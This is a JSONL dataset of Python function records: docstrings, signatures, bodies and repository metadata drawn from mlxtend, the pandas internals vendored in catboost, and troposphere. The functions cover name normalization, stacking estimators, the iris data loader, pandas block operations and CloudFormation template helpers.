{"docstring": "\"\"\"Generalize a person's first and last name.\n\nDescription : Returns a person's name in the format\n`<last_name><separator><firstname letter(s)> (all lowercase)`\n\nParameters\n----------\nname : `str`\n    Name of the player\noutput_sep : `str` (default: ' ')\n    String for separating last name and first name in the output.\nfirstname_output_letters : `int`\n    Number of letters in the abbreviated first name.\n\nReturns\n----------\ngen_name : `str`\n    The generalized name.\n\nExamples\n-----------\nFor usage examples, please see\nhttp://rasbt.github.io/mlxtend/user_guide/text/generalize_names/\n\n\"\"\"\n# set first and last name positions\n", "func_signal": "def generalize_names(name, output_sep=' ', firstname_output_letters=1):\n", "code": "last, first = 'last', 'first'\nlast_pos = -1\n\nname = name.lower()\n\n# fix primarily Dutch names\nexc = ['van der ', 'de ', 'van ', 'von ', 'di ']\nfor e in exc:\n    if name.startswith(e):\n        repl = e.replace(' ', '')\n        name = (repl + name[len(e) - 1:].strip())\n\nexc = [' van der ', ' de ', ' van ', ' von ', ' di ',\n       ', van der ', ', de', ', van ', ', von ', ', di ']\n\nfor e in exc:\n    name = name.replace(e, ' ' + e.replace(' ', ''))\n\nif ',' in name:\n    last, first = first, last\n    name = name.replace(',', '')\n    last_pos = 1\n\nspl = name.split()\nif len(spl) > 2:\n    name = '%s %s' % (spl[0], spl[last_pos])\n\n# remove accents\nif sys.version_info.major == 2:\n    name = name.decode('utf-8')\n\nname = ''.join(x for x in unicodedata.normalize('NFKD', name)\n               if x in string.ascii_letters + ' ')\n\n# get first and last name if applicable\nm = re.match(r'(?P<first>\\w+)\\W+(?P<last>\\w+)', name)\nif m:\n    output = '%s%s%s' % (m.group(last),\n                         output_sep,\n                         m.group(first)[:firstname_output_letters])\nelse:\n    output = name\n\ngen_name = output.strip()\nreturn gen_name", "path": "mlxtend/mlxtend/text/names.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" Predict target values for X.\n\nParameters\n----------\nX : numpy array, shape = [n_samples, n_features]\n    Training vectors, where n_samples is the number of samples and\n    n_features is the number of features.\n\nReturns\n----------\nlabels : array-like, shape = [n_samples]\n    Predicted class labels.\n\n\"\"\"\n", "func_signal": "def predict(self, X):\n", "code": "check_is_fitted(self, ['clfs_', 'meta_clf_'])\n\nreturn self._do_predict(X, self.meta_clf_.predict)", "path": "mlxtend/mlxtend/classifier/_base_classification.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\"Print current iteration and time elapsed.\"\"\"\n", "func_signal": "def update(self):\n", "code": "self.curr_iter += 1\n\nself.end_time = time.time()\n\nout = '%d iter | %s sec' % (self.curr_iter,\n                            self.precision % (self.end_time\n                                              - self.start_time))\n\nself.stream.write('\\r%s%s' % (self._print_name, out))\nself.stream.flush()", "path": "mlxtend/mlxtend/utils/counter.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "# meta regressor with no support for\n# sample_weight should raise error\n", "func_signal": "def test_weight_unsupported_meta():\n", "code": "lr = LinearRegression()\nsvr_lin = SVR(kernel='linear', gamma='auto')\nridge = Ridge(random_state=1)\nknn = KNeighborsRegressor()\nstregr = StackingRegressor(regressors=[svr_lin, lr, ridge],\n                           meta_regressor=knn)\n\nwith pytest.raises(TypeError):\n    stregr.fit(X1, y, sample_weight=w).predict(X1)", "path": "mlxtend/mlxtend/regressor/tests/test_stacking_regression.py", "commit_date": "2020-06-29 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "# pass no weight to regressors with no weight support\n# should not be a problem\n", "func_signal": "def test_weight_unsupported_with_no_weight():\n", "code": "lr = LinearRegression()\nsvr_lin = SVR(kernel='linear', gamma='auto')\nridge = Ridge(random_state=1)\nsvr_rbf = SVR(kernel='rbf', gamma='auto')\nknn = KNeighborsRegressor()\nstregr = StackingRegressor(regressors=[svr_lin, lr, ridge, knn],\n                           meta_regressor=svr_rbf)\nstregr.fit(X1, y).predict(X1)\n\nstregr = StackingRegressor(regressors=[svr_lin, lr, ridge],\n                           meta_regressor=knn)\nstregr.fit(X1, y).predict(X1)", "path": "mlxtend/mlxtend/regressor/tests/test_stacking_regression.py", "commit_date": "2020-06-29 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" Predict class confidence scores for X.\n\nParameters\n----------\nX : {array-like, sparse matrix}, shape = [n_samples, n_features]\n    Training vectors, where n_samples is the number of samples and\n    n_features is the number of features.\n\nReturns\n----------\nscores : shape=(n_samples,) if n_classes == 2 else \\\n    (n_samples, n_classes).\n    Confidence scores per (sample, class) combination. In the binary\n    case, confidence score for self.classes_[1] where >0 means this\n    class would be predicted.\n\n\"\"\"\n", "func_signal": "def decision_function(self, X):\n", "code": "check_is_fitted(self, ['clfs_', 'meta_clf_'])\n\nreturn self._do_predict(X, self.meta_clf_.decision_function)", "path": "mlxtend/mlxtend/classifier/_base_classification.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\"Iris flower dataset.\n\nSource : https://archive.ics.uci.edu/ml/datasets/Iris\nNumber of samples : 150\nClass labels : {0, 1, 2}, distribution: [50, 50, 50]\n    0 = setosa, 1 = versicolor, 2 = virginica.\n\nDataset Attributes:\n\n    - 1) sepal length [cm]\n    - 2) sepal width [cm]\n    - 3) petal length [cm]\n    - 4) petal width [cm]\n\n\nParameters\n--------\nversion : string, optional (default: 'uci').\n  Version to use {'uci', 'corrected'}. 'uci' loads the dataset\n  as deposited on the UCI machine learning repository, and \n  'corrected' provides the version that is consistent with\n  Fisher's original paper. See Note for details.\n\n\nReturns\n--------\nX, y : [n_samples, n_features], [n_class_labels]\n    X is the feature matrix with 150 flower samples as rows,\n    and 4 feature columns sepal length, sepal width,\n    petal length, and petal width.\n    y is a 1-dimensional array of the class labels {0, 1, 2}\n\n\nNote\n--------\nThe Iris dataset (originally collected by Edgar Anderson) and\navailable in UCI's machine learning repository is different from\nthe Iris dataset described in the original paper by  R.A. Fisher [1]). \nPrecisely, there are two data points (row number\n34 and 37) in UCI's Machine Learning repository are different from the\norigianlly published Iris dataset. Also, the original version of the Iris\nDataset, which can be loaded via `version='corrected'` is the same\nas the one in R.\n\n[1] . A. Fisher (1936). \"The use of multiple measurements in taxonomic\nproblems\". Annals of Eugenics. 7 (2): 179\u2013188\n\nExamples\n-----------\nFor usage examples, please see\nhttp://rasbt.github.io/mlxtend/user_guide/data/iris_data/\n\n\"\"\"\n", "func_signal": "def iris_data(version='uci'):\n", "code": "if version == \"uci\":\n    tmp = np.genfromtxt(fname=DATA_PATH, delimiter=',')\n    X, y = tmp[:, :-1], tmp[:, -1]\n    y = y.astype(int)\nelif version == \"corrected\":\n    tmp = np.genfromtxt(fname=DATA_PATH, delimiter=',')\n    X, y = tmp[:, :-1], tmp[:, -1]\n    X[34] = [4.9, 3.1, 1.5, 0.2]\n    X[37] = [4.9, 3.6, 1.4, 0.1]\n    y = y.astype(int)\nelse:\n    raise ValueError(\"version must be 'uci' or 'corrected'.\")\nreturn X, y", "path": "mlxtend/mlxtend/data/iris.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\"\nInserts a list of items into the tree.\n\nParameters\n----------\nitemset : list\n    Items that will be inserted into the tree.\ncount : int\n    The number of occurrences of the itemset.\n\"\"\"\n", "func_signal": "def insert_itemset(self, itemset, count=1):\n", "code": "self.root.count += count\n\nif len(itemset) == 0:\n    return\n\n# Follow existing path in tree as long as possible\nindex = 0\nnode = self.root\nfor item in itemset:\n    if item in node.children:\n        child = node.children[item]\n        child.count += count\n        node = child\n        index += 1\n    else:\n        break\n\n# Insert any remaining items\nfor item in itemset[index:]:\n    child_node = FPNode(item, count, node)\n    self.nodes[item].append(child_node)\n    node = child_node", "path": "mlxtend/mlxtend/frequent_patterns/fpcommon.py", "commit_date": "2020-02-24 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\"Set the parameters of this estimator.\n\nValid parameter keys can be listed with ``get_params()``.\n\nReturns\n-------\nself\n\"\"\"\n", "func_signal": "def set_params(self, **params):\n", "code": "self._set_params('classifiers', 'named_classifiers', **params)\nreturn self", "path": "mlxtend/mlxtend/classifier/stacking_cv_classification.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\"\nFunction to calculate the number of possible combinations.\n\nParameters\n----------\nn : `int`\n    Total number of items.\nk : `int`\n    Number of elements of the target itemset.\nwith_replacement : `bool` (default: False)\n    Allows repeated elements if True.\n\nReturns\n----------\ncomb : `int`\n    Number of possible combinations.\n\nExamples\n-----------\nFor usage examples, please see\nhttp://rasbt.github.io/mlxtend/user_guide/math/num_combinations/\n\n\"\"\"\n", "func_signal": "def num_combinations(n, k, with_replacement=False):\n", "code": "if with_replacement:\n    numerator = factorial(n + k - 1)\n    denominator = factorial(k) * factorial(n-1)\nelse:\n    numerator = factorial(n)\n    denominator = factorial(k) * factorial(n-k)\ncomb = numerator//denominator\nreturn comb", "path": "mlxtend/mlxtend/math/counting.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\"\nFunction to calculate the number of possible permutations.\n\nParameters\n----------\nn : `int`\n  Total number of items.\nk : `int`\n  Number of elements of the target itemset.\nwith_replacement : `bool`\n  Allows repeated elements if True.\n\nReturns\n----------\npermut : `int`\n  Number of possible permutations.\n\nExamples\n-----------\nFor usage examples, please see\nhttp://rasbt.github.io/mlxtend/user_guide/math/num_permutations/\n\n\"\"\"\n", "func_signal": "def num_permutations(n, k, with_replacement=False):\n", "code": "if with_replacement:\n    permut = n**k\nelse:\n    numerator = factorial(n)\n    denominator = factorial(n-k)\n    permut = numerator//denominator\nreturn permut", "path": "mlxtend/mlxtend/math/counting.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "# including regressor that does not support\n# sample_weight should raise error\n", "func_signal": "def test_weight_unsupported_regressor():\n", "code": "lr = LinearRegression()\nsvr_lin = SVR(kernel='linear', gamma='auto')\nridge = Ridge(random_state=1)\nsvr_rbf = SVR(kernel='rbf', gamma='auto')\nknn = KNeighborsRegressor()\nstregr = StackingRegressor(regressors=[svr_lin, lr, ridge, knn],\n                           meta_regressor=svr_rbf)\n\nwith pytest.raises(TypeError):\n    stregr.fit(X1, y, sample_weight=w).predict(X1)", "path": "mlxtend/mlxtend/regressor/tests/test_stacking_regression.py", "commit_date": "2020-06-29 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" Generalizes names and removes duplicates.\n\nDescription : Applies mlxtend.text.generalize_names to a DataFrame\nwith 1 first name letter by default\nand uses more first name letters if duplicates are detected.\n\nParameters\n----------\ndf : `pandas.DataFrame`\n    DataFrame that contains a column where\n    generalize_names should be applied.\ncol_name : `str`\n    Name of the DataFrame column where `generalize_names`\n    function should be applied to.\n\nReturns\n----------\ndf_new : `str`\n    New DataFrame object where generalize_names function has\n    been applied without duplicates.\n\nExamples\n-----------\nFor usage examples, please see\nhttp://rasbt.github.io/mlxtend/user_guide/text/generalize_names_duplcheck/\n\n\"\"\"\n", "func_signal": "def generalize_names_duplcheck(df, col_name):\n", "code": "df_new = df.copy()\n\ndf_new.drop_duplicates(subset=[col_name], inplace=True)\n\ndf_new[col_name] = df_new[col_name].apply(generalize_names)\n\nif Version(pandas_version) < '0.17':\n    dupl = (list(df_new[df_new.duplicated(subset=col_name,\n                                          keep='last')].index) +\n            list(df_new[df_new.duplicated(subset=col_name,\n                                          keep='first')].index))\nelse:\n    dupl = (list(df_new[df_new.duplicated(subset=col_name,\n                                          keep='last')].index) +\n            list(df_new[df_new.duplicated(subset=col_name,\n                                          keep='first')].index))\n\nfirstname_letters = 2\nwhile len(dupl) > 0:\n    for idx in dupl:\n        df_new.loc[idx, col_name] = generalize_names(\n            df.loc[idx, col_name],\n            firstname_output_letters=firstname_letters)\n    if Version(pandas_version) < '0.17':\n        dupl = (list(df_new[df_new.duplicated(subset=col_name,\n                                              keep='last')].index) +\n                list(df_new[df_new.duplicated(subset=col_name,\n                                              keep='first')].index))\n    else:\n        dupl = (list(df_new[df_new.duplicated(subset=col_name,\n                                              keep='last')].index) +\n                list(df_new[df_new.duplicated(subset=col_name,\n                                              keep='first')].index))\n    firstname_letters += 1\nreturn df_new", "path": "mlxtend/mlxtend/text/names.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" try to cast the result to our original type, we may have\nroundtripped thru object in the mean-time\n\"\"\"\n", "func_signal": "def _try_cast_result(self, result, dtype=None):\n", "code": "if dtype is None:\n    dtype = self.dtype\n\nif self.is_integer or self.is_bool or self.is_datetime:\n    pass\nelif self.is_float and result.dtype == self.dtype:\n\n    # protect against a bool/object showing up here\n    if isinstance(dtype, compat.string_types) and dtype == 'infer':\n        return result\n    if not isinstance(dtype, type):\n        dtype = dtype.type\n    if issubclass(dtype, (np.bool_, np.object_)):\n        if issubclass(dtype, np.bool_):\n            if isna(result).all():\n                return result.astype(np.bool_)\n            else:\n                result = result.astype(np.object_)\n                result[result == 1] = True\n                result[result == 0] = False\n                return result\n        else:\n            return result.astype(np.object_)\n\n    return result\n\n# may need to change the dtype here\nreturn maybe_downcast_to_dtype(result, dtype)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"\nParameters\n----------\nlabels : list of new axis labels\nshape : new shape\nref_items : new ref_items\n\nreturn a new block that is transformed to a nd block\n\"\"\"\n", "func_signal": "def reshape_nd(self, labels, shape, ref_items):\n", "code": "return _block2d_to_blocknd(values=self.get_values().T,\n                           placement=self.mgr_locs, shape=shape,\n                           labels=labels, ref_items=ref_items)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"\nGet the placement, values, and mask for a Block unstack.\n\nThis is shared between ObjectBlock and ExtensionBlock. They\ndiffer in that ObjectBlock passes the values, while ExtensionBlock\npasses the dummy ndarray of positions to be used by a take\nlater.\n\nParameters\n----------\nunstacker : pandas.core.reshape.reshape._Unstacker\nnew_columns : Index\n    All columns of the unstacked BlockManager.\n\nReturns\n-------\nnew_placement : ndarray[int]\n    The placement of the new columns in `new_columns`.\nnew_values : Union[ndarray, ExtensionArray]\n    The first return value from _Unstacker.get_new_values.\nmask : ndarray[bool]\n    The second return value from _Unstacker.get_new_values.\n\"\"\"\n# shared with ExtensionBlock\n", "func_signal": "def _get_unstack_items(self, unstacker, new_columns):\n", "code": "new_items = unstacker.get_new_columns()\nnew_placement = new_columns.get_indexer(new_items)\nnew_values, mask = unstacker.get_new_values()\n\nmask = mask.any(0)\nreturn new_placement, new_values, mask", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "# ExtensionArrays must be iterable, so this works.\n", "func_signal": "def get_values(self, dtype=None):\n", "code": "values = np.asarray(self.values)\nif values.ndim == self.ndim - 1:\n    values = values.reshape((1,) + values.shape)\nreturn values", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\" require the same dtype as ourselves \"\"\"\n", "func_signal": "def _can_hold_element(self, element):\n", "code": "dtype = self.values.dtype.type\ntipo = maybe_infer_dtype_type(element)\nif tipo is not None:\n    return issubclass(tipo.type, dtype)\nreturn isinstance(element, dtype)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "# allow filling with integers to be\n        # interpreted as nanoseconds\n", "func_signal": "def fillna(self, value, **kwargs):\n", "code": "        if is_integer(value) and not isinstance(value, np.timedelta64):\n            # Deprecation GH#24694, GH#19233\n            warnings.warn(\"Passing integers to fillna is deprecated, will \"\n                          \"raise a TypeError in a future version.  To retain \"\n                          \"the old behavior, pass pd.Timedelta(seconds=n) \"\n                          \"instead.\",\n                          FutureWarning, stacklevel=6)\n            value = Timedelta(value, unit='s')\n        return super(TimeDeltaBlock, self).fillna(value, **kwargs)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "# ExtensionArray-safe unstack.\n# We override ObjectBlock._unstack, which unstacks directly on the\n# values of the array. For EA-backed blocks, this would require\n# converting to a 2-D ndarray of objects.\n# Instead, we unstack an ndarray of integer positions, followed by\n# a `take` on the actual values.\n", "func_signal": "def _unstack(self, unstacker_func, new_columns, n_rows, fill_value):\n", "code": "dummy_arr = np.arange(n_rows)\ndummy_unstacker = functools.partial(unstacker_func, fill_value=-1)\nunstacker = dummy_unstacker(dummy_arr)\n\nnew_placement, new_values, mask = self._get_unstack_items(\n    unstacker, new_columns\n)\n\nblocks = [\n    self.make_block_same_class(\n        self.values.take(indices, allow_fill=True,\n                         fill_value=fill_value),\n        [place])\n    for indices, place in zip(new_values.T, new_placement)\n]\nreturn blocks, mask", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\" copy constructor \"\"\"\n", "func_signal": "def copy(self, deep=True):\n", "code": "values = self.values\nif deep:\n    values = values.copy()\nreturn self.make_block_same_class(values)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "# We support filling a DatetimeTZ with a `value` whose timezone\n# is different by coercing to object.\n", "func_signal": "def fillna(self, value, limit=None, inplace=False, downcast=None):\n", "code": "try:\n    return super(DatetimeTZBlock, self).fillna(\n        value, limit, inplace, downcast\n    )\nexcept (ValueError, TypeError):\n    # different timezones, or a non-tz\n    return self.astype(object).fillna(\n        value, limit=limit, inplace=inplace, downcast=downcast\n    )", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"Set the value inplace, returning a same-typed block.\n\nThis differs from Block.setitem by not allowing setitem to change\nthe dtype of the Block.\n\nParameters\n----------\nindexer : tuple, list-like, array-like, slice\n    The subset of self.values to set\nvalue : object\n    The value being set\n\nReturns\n-------\nBlock\n\nNotes\n-----\n`indexer` is a direct slice/positional indexer. `value` must\nbe a compatible shape.\n\"\"\"\n", "func_signal": "def setitem(self, indexer, value):\n", "code": "if isinstance(indexer, tuple):\n    # we are always 1-D\n    indexer = indexer[0]\n\ncheck_setitem_lengths(indexer, value, self.values)\nself.values[indexer] = value\nreturn self", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"\nReturn a new ndarray, try to preserve dtype if possible.\n\nParameters\n----------\nv : `values`, updated in-place (array like)\nm : `mask`, applies to both sides (array like)\nn : `new values` either scalar or an array like aligned with `values`\n\nReturns\n-------\nvalues : ndarray with updated values\n    this *may* be a copy of the original\n\nSee Also\n--------\nndarray.putmask\n\"\"\"\n\n# we cannot use np.asarray() here as we cannot have conversions\n# that numpy does when numeric are mixed with strings\n\n# n should be the length of the mask or a scalar here\n", "func_signal": "def _putmask_smart(v, m, n):\n", "code": "if not is_list_like(n):\n    n = np.repeat(n, len(m))\nelif isinstance(n, np.ndarray) and n.ndim == 0:  # numpy scalar\n    n = np.repeat(np.array(n, ndmin=1), len(m))\n\n# see if we are only masking values that if putted\n# will work in the current dtype\ntry:\n    nn = n[m]\n\n    # make sure that we have a nullable type\n    # if we have nulls\n    if not _isna_compat(v, nn[0]):\n        raise ValueError\n\n    # we ignore ComplexWarning here\n    with warnings.catch_warnings(record=True):\n        warnings.simplefilter(\"ignore\", np.ComplexWarning)\n        nn_at = nn.astype(v.dtype)\n\n    # avoid invalid dtype comparisons\n    # between numbers & strings\n\n    # only compare integers/floats\n    # don't compare integers to datetimelikes\n    if (not is_numeric_v_string_like(nn, nn_at) and\n        (is_float_dtype(nn.dtype) or\n         is_integer_dtype(nn.dtype) and\n         is_float_dtype(nn_at.dtype) or\n         is_integer_dtype(nn_at.dtype))):\n\n        comp = (nn == nn_at)\n        if is_list_like(comp) and comp.all():\n            nv = v.copy()\n            nv[m] = nn_at\n            return nv\nexcept (ValueError, IndexError, TypeError, OverflowError):\n    pass\n\nn = np.asarray(n)\n\ndef _putmask_preserve(nv, n):\n    try:\n        nv[m] = n[m]\n    except (IndexError, ValueError):\n        nv[m] = n\n    return nv\n\n# preserves dtype if possible\nif v.dtype.kind == n.dtype.kind:\n    return _putmask_preserve(v, n)\n\n# change the dtype if needed\ndtype, _ = maybe_promote(n.dtype)\n\nif is_extension_type(v.dtype) and is_object_dtype(dtype):\n    v = v.get_values(dtype)\nelse:\n    v = v.astype(dtype)\n\nreturn _putmask_preserve(v, n)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"\nIf possible, reshape `arr` to have shape `new_shape`,\nwith a couple of exceptions (see gh-13012):\n\n1) If `arr` is a ExtensionArray or Index, `arr` will be\n   returned as is.\n2) If `arr` is a Series, the `_values` attribute will\n   be reshaped and returned.\n\nParameters\n----------\narr : array-like, object to be reshaped\nnew_shape : int or tuple of ints, the new shape\n\"\"\"\n", "func_signal": "def _safe_reshape(arr, new_shape):\n", "code": "if isinstance(arr, ABCSeries):\n    arr = arr._values\nif not isinstance(arr, ABCExtensionArray):\n    arr = arr.reshape(new_shape)\nreturn arr", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"Input validation for values passed to __init__. Ensure that\nwe have datetime64TZ, coercing if necessary.\n\nParametetrs\n-----------\nvalues : array-like\n    Must be convertible to datetime64\n\nReturns\n-------\nvalues : DatetimeArray\n\"\"\"\n", "func_signal": "def _maybe_coerce_values(self, values):\n", "code": "if not isinstance(values, self._holder):\n    values = self._holder(values)\n\nif values.tz is None:\n    raise ValueError(\"cannot create a DatetimeTZBlock without a tz\")\n\nreturn values", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"\nModify Block in-place with new item value\n\nReturns\n-------\nNone\n\"\"\"\n", "func_signal": "def set(self, locs, values):\n", "code": "values = conversion.ensure_datetime64ns(values, copy=False)\n\nself.values[locs] = values", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\" reverse of try_coerce_args \"\"\"\n\n# GH12564: CategoricalBlock is 1-dim only\n# while returned results could be any dim\n", "func_signal": "def _try_coerce_result(self, result):\n", "code": "if ((not is_categorical_dtype(result)) and\n        isinstance(result, np.ndarray)):\n    result = _block_shape(result, ndim=self.ndim)\n\nreturn result", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\" return block for the diff of the values \"\"\"\n", "func_signal": "def diff(self, n, axis=1):\n", "code": "new_values = algos.diff(self.values, n, axis=axis)\nreturn [self.make_block(values=new_values)]", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"\nthese automatically copy, so copy=True has no effect\nraise on an except if raise == True\n\"\"\"\n", "func_signal": "def _astype(self, dtype, **kwargs):\n", "code": "dtype = pandas_dtype(dtype)\n\n# if we are passed a datetime64[ns, tz]\nif is_datetime64tz_dtype(dtype):\n    values = self.values\n    if getattr(values, 'tz', None) is None:\n        values = DatetimeIndex(values).tz_localize('UTC')\n    values = values.tz_convert(dtype.tz)\n    return self.make_block(values)\n\n# delegate\nreturn super(DatetimeBlock, self)._astype(dtype=dtype, **kwargs)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"1st discrete difference\n\nParameters\n----------\nn : int, number of periods to diff\naxis : int, axis to diff upon. default 0\n\nReturn\n------\nA list with a new TimeDeltaBlock.\n\nNote\n----\nThe arguments here are mimicking shift so they are called correctly\nby apply.\n\"\"\"\n", "func_signal": "def diff(self, n, axis=0):\n", "code": "if axis == 0:\n    # Cannot currently calculate diff across multiple blocks since this\n    # function is invoked via apply\n    raise NotImplementedError\nnew_values = (self.values - self.shift(n, axis=axis)[0].values).asi8\n\n# Reshape the new_values like how algos.diff does for timedelta data\nnew_values = new_values.reshape(1, len(new_values))\nnew_values = new_values.astype('timedelta64[ns]')\nreturn [TimeDeltaBlock(new_values, placement=self.mgr_locs.indexer)]", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "# https://github.com/pandas-dev/pandas/issues/24020\n# Need a dedicated setitem until #24020 (type promotion in setitem\n# for extension arrays) is designed and implemented.\n", "func_signal": "def setitem(self, indexer, value):\n", "code": "try:\n    return super(DatetimeTZBlock, self).setitem(indexer, value)\nexcept (ValueError, TypeError):\n    newb = make_block(self.values.astype(object),\n                      placement=self.mgr_locs,\n                      klass=ObjectBlock,)\n    return newb.setitem(indexer, value)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "# when inserting a column should not coerce integers to floats\n# unnecessarily\n", "func_signal": "def should_store(self, value):\n", "code": "return (issubclass(value.dtype.type, np.floating) and\n        value.dtype == self.dtype)", "path": "catboost/contrib/python/pandas/py2/pandas/core/internals/blocks.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "catboost/catboost", "stars": 7654, "license": "apache-2.0", "language": "python", "size": 1669134}
{"docstring": "\"\"\"Get the events in batches and return in chronological order\"\"\"\n", "func_signal": "def get_events(conn, stackname):\n", "code": "next = None\nevent_list = []\nwhile 1:\n    events = conn.describe_stack_events(stackname, next)\n    event_list.append(events)\n    if events.next_token is None:\n        break\n    next = events.next_token\n    time.sleep(1)\nreturn reversed(sum(event_list, []))", "path": "troposphere/troposphere/utils.py", "commit_date": "2015-09-23 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nReturns the function object that matches the provided name.\nOnly Fn:: and Ref functions are supported here so that other\nfunctions specific to troposphere are skipped.\n\"\"\"\n", "func_signal": "def _get_function_type(self, function_name):\n", "code": "if (function_name.startswith(\"Fn::\") and\n        function_name[4:] in self.inspect_functions):\n    return self.inspect_functions[function_name[4:]]\nreturn (self.inspect_functions['Ref'] if function_name == \"Ref\"\n        else None)", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
